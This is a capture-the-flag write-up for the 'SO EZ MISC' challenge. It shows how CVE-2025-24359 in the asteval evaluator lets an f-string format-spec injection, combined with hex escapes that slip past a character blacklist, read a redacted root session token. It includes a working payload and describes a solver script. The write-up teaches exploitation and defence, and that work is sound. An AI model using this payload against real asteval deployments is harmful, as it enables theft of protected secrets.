# SO EZ MISC

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Miscellaneous |
| Difficulty | Baby |
| Points | 493 |
| Author | xzhiyouu |
| Connection | `nc chal.thjcc.org 9006` |
| Protocol transcript | [`artifacts/protocol-transcript.txt`](artifacts/protocol-transcript.txt) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}` |

## Overview

The service exposes a small calculator and gives us one unusual hint:

```text
Your workbook is WB.

ps. The bug has no patch.
```

Entering `WB` reveals a nested Python object representing a workbook. Its audit
sheet belongs to a root user whose session contains a redacted `Secret` token.
The calculator blocks ordinary attribute access, indexing, underscores, and
reflection helpers, so an expression such as `WB.sheets["audit"]` cannot reach
the token directly.

The evaluator is `asteval`. Its error messages and f-string behavior match the
vulnerable implementation affected by
[CVE-2025-24359](https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7).
That version reconstructs an f-string's format specification and passes it to
Python's `str.format`. A malicious format specification can close the original
replacement field and inject a second one. Python format fields perform both
attribute and item traversal outside `asteval`'s AST attribute handler.

The input blacklist examines the source text before Python decodes string
escapes. Writing forbidden characters as `\xNN` sequences therefore lets the
injected field survive the blacklist. The final payload traverses the complete
object path and prints the raw secret value in one request.

## 1. Enumerating the Calculator

The endpoint opens with a minimal prompt:

```text
calc>
```

A basic arithmetic expression confirms that input is evaluated rather than
treated as a spreadsheet formula string:

```text
calc> 1+1
2
```

The challenge description identifies the interesting name:

```text
calc> WB
Workbook(name='Q3-Financials', sheets={
  'summary': Sheet(
    title='Summary',
    owner=User(name='guest', role='viewer',
      session=Session(id='sess-0000', token=<Secret value=***REDACTED***>)),
    cells={'A1': 42, 'A2': 1337}),
  'audit': Sheet(
    title='Audit Trail',
    owner=User(name='auditor', role='root',
      session=Session(id='sess-c0ffee', token=<Secret value=***REDACTED***>)),
    cells={'A1': 0})})
```

This output gives the target path conceptually:

```text
WB
`-- sheets
    `-- audit
        `-- owner
            `-- session
                `-- token
                    `-- value
```

The normal representation of the `Secret` deliberately replaces its value
with `***REDACTED***`. We need to retrieve the internal `value` attribute rather
than merely print the token object.

## 2. Mapping the Restrictions

Direct object traversal fails at several independent layers:

```text
calc> WB.name
error: Attribute not supported

calc> WB.sheets["audit"]
error: banned character '['

calc> __import__("os")
error: banned character '_'
```

Common reflection helpers are absent from the symbol table:

```text
calc> getattr(WB,"name")
error: name 'getattr' is not defined

calc> vars(WB)
error: name 'vars' is not defined

calc> dir(WB)
error: name 'dir' is not defined
```

At the same time, functions such as `str`, `int`, `float`, `bool`, `len`,
`sum`, `min`, and `max` are exposed. The following distinctive `asteval` error
confirms the evaluator family:

```text
error: Error running function 'int' with args '[Workbook(...)]'
and kwargs {}: int() argument must be ... not 'Workbook'
```

The service has disabled `asteval`'s ordinary `Attribute` AST handler, but it
still permits f-strings and therefore the vulnerable formatted-value path.

## 3. Understanding the Vulnerable F-String Handler

The affected implementation evaluates a formatted value using logic equivalent
to:

```python
value = run(node.value)
format_string = "{__fstring__}"

if node.format_spec is not None:
    specification = run(node.format_spec)
    format_string = f"{{__fstring__:{specification}}}"

return format_string.format(__fstring__=value)
```

The vulnerability is the final call to `str.format` with a format string partly
controlled by the expression. A format specification is supposed to contain a
width, alignment, or numeric presentation such as `.2f`. Nothing prevents it
from containing a closing brace followed by a new replacement field.

Let the evaluated format specification be:

```text
}{__fstring__.sheets[audit].owner.session.token.value
```

The handler surrounds that value with its own prefix and final brace:

```text
prefix:       {__fstring__:
attacker:     }{__fstring__.sheets[audit].owner.session.token.value
final brace:  }
```

The reconstructed string is therefore:

```text
{__fstring__:}{__fstring__.sheets[audit].owner.session.token.value}
```

Python interprets this as two fields:

1. `{__fstring__:}` prints the workbook itself with an empty format specifier.
2. The second field follows `.sheets`, selects `[audit]`, and continues through
   `.owner.session.token.value`.

This traversal is performed by Python's format engine. It never passes through
the evaluator's disabled `Attribute` or subscript handlers.

## 4. Bypassing the Character Blacklist

The desired injected field contains underscores and square brackets, which the
front-end filter rejects when they appear literally. The filter runs before
escape sequences inside the f-string are decoded.

Encode each forbidden or structural character as follows:

| Character | Escape |
| --- | --- |
| `{` | `\x7b` |
| `}` | `\x7d` |
| `_` | `\x5f` |
| `[` | `\x5b` |
| `]` | `\x5d` |

The complete source expression becomes:

```python
f"{WB:\x7d\x7b\x5f\x5ffstring\x5f\x5f.sheets\x5baudit\x5d.owner.session.token.value}"
```

The raw expression contains no literal underscore or bracket. After parsing,
its format specification has the exact malicious value needed by the
vulnerable handler.

## 5. Retrieving the Secret

Submitting the escaped expression produces the ordinary workbook
representation followed immediately by the injected second field:

```text
calc> f"{WB:\x7d\x7b\x5f\x5ffstring\x5f\x5f.sheets\x5baudit\x5d.owner.session.token.value}"
Workbook(name='Q3-Financials', sheets={...})THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}
```

Accessing the token object alone would still call its redacting representation:

```text
<Secret value=***REDACTED***>
```

The final `.value` component is therefore essential. It returns the underlying
string instead of the protected object's representation.

## 6. Automated Solver

The included [`solve.py`](solve.py) uses only Python's standard library. It:

1. Builds the target path in readable form.
2. Prepends the brace sequence that terminates the original format field.
3. Replaces every blocked character with a hexadecimal escape.
4. Verifies locally that the transmitted source has no literal underscores or
   brackets.
5. Sends the expression to the calculator and extracts `THJCC{...}` from the
   response.

Run it from the challenge directory:

```bash
python3 solve.py
```

Expected output:

```text
payload: f"{WB:\x7d\x7b\x5f\x5ffstring\x5f\x5f.sheets\x5baudit\x5d.owner.session.token.value}"
flag: THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}
```

An alternative host and port can be supplied positionally:

```bash
python3 solve.py chal.thjcc.org 9006
```

## Security Lessons

- Blacklists operate on one representation of input. Parsers, escape decoding,
  and later interpreters can transform that representation into blocked syntax.
- Disabling attribute nodes in an AST does not help if another permitted
  feature invokes a second language with its own attribute traversal rules.
- Python format strings are not passive templates when attackers control field
  syntax; they can walk attributes and mapping keys.
- Redacting `repr()` is only a presentation control. It does not protect the
  underlying value from arbitrary object traversal.
- The appropriate fix is to update the vulnerable evaluator, remove untrusted
  f-string support, and expose only primitive copied data rather than privileged
  application objects.

## Flag

```text
THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}
```
